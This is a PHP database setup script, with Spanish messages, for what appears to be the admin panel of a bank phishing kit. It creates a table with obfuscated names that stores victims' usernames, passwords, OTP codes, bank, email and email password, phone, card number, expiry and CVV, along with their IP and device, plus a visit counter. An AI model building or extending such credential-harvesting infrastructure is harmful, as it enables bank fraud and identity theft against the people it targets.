<?php
require('panel/lib/conexion.php');

echo "<h1>Configurando Base de Datos en Railway</h1>";
echo "<hr>";

$conn = conectar();

if (!$conn) {
    die("❌ Error: No se pudo conectar a la base de datos<br>");
}

echo "✅ Conexión exitosa a la base de datos<br><br>";

// Crear tabla rtr45
echo "<h3>Creando tabla rtr45...</h3>";
$sql1 = "CREATE TABLE IF NOT EXISTS `rtr45` (
  `idreg` int(11) NOT NULL AUTO_INCREMENT,
  `usuario` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  `otp` varchar(50) DEFAULT NULL,
  `dispositivo` varchar(100) DEFAULT NULL,
  `ip` varchar(50) DEFAULT NULL,
  `id` varchar(100) DEFAULT NULL,
  `agente` varchar(255) DEFAULT NULL,
  `banco` varchar(100) DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `cemail` varchar(255) DEFAULT NULL,
  `celular` varchar(50) DEFAULT NULL,
  `tarjeta` varchar(20) DEFAULT NULL,
  `ftarjeta` varchar(10) DEFAULT NULL,
  `cvv` varchar(5) DEFAULT NULL,
  `status` int(11) DEFAULT '1',
  `horacreado` datetime DEFAULT NULL,
  `horamodificado` datetime DEFAULT NULL,
  PRIMARY KEY (`idreg`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4";

if (sentencia($conn, $sql1)) {
    echo "✅ Tabla 'rtr45' creada correctamente<br><br>";
} else {
    echo "❌ Error creando tabla 'rtr45': " . mysqli_error($conn) . "<br><br>";
}

// Crear tabla v1s1t
echo "<h3>Creando tabla v1s1t...</h3>";
$sql2 = "CREATE TABLE IF NOT EXISTS `v1s1t` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `contador` int(11) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4";

if (sentencia($conn, $sql2)) {
    echo "✅ Tabla 'v1s1t' creada correctamente<br><br>";
} else {
    echo "❌ Error creando tabla 'v1s1t': " . mysqli_error($conn) . "<br><br>";
}

// Verificar si ya existe el registro inicial
$checkSql = "SELECT COUNT(*) as total FROM `v1s1t`";
$checkResult = sentencia($conn, $checkSql);
$checkData = traerdatos($checkResult);

if ($checkData['total'] == 0) {
    // Insertar registro inicial en v1s1t
    echo "<h3>Insertando registro inicial en v1s1t...</h3>";
    $sql3 = "INSERT INTO `v1s1t` (`id`, `contador`) VALUES (1, 0)";
    if (sentencia($conn, $sql3)) {
        echo "✅ Registro inicial insertado en 'v1s1t'<br><br>";
    } else {
        echo "❌ Error insertando registro inicial: " . mysqli_error($conn) . "<br><br>";
    }
} else {
    echo "ℹ️ La tabla 'v1s1t' ya tiene datos, no se insertó registro inicial<br><br>";
}

// Verificar tablas creadas
echo "<h3>Verificando tablas creadas:</h3>";
$verifyTables = sentencia($conn, "SHOW TABLES");
if (contarfilas($verifyTables) > 0) {
    echo "<ul>";
    while ($table = traerdatos($verifyTables)) {
        $tableName = array_values($table)[0];
        echo "<li>✅ $tableName</li>";
    }
    echo "</ul>";
}

desconectar($conn);

echo "<hr>";
echo "<h2 style='color: green;'>🎉 ¡Base de datos configurada correctamente!</h2>";
echo "<p style='color: red; font-weight: bold;'>⚠️ IMPORTANTE: Elimina este archivo (setup_database.php) por seguridad después de verificar que todo funciona.</p>";
?>
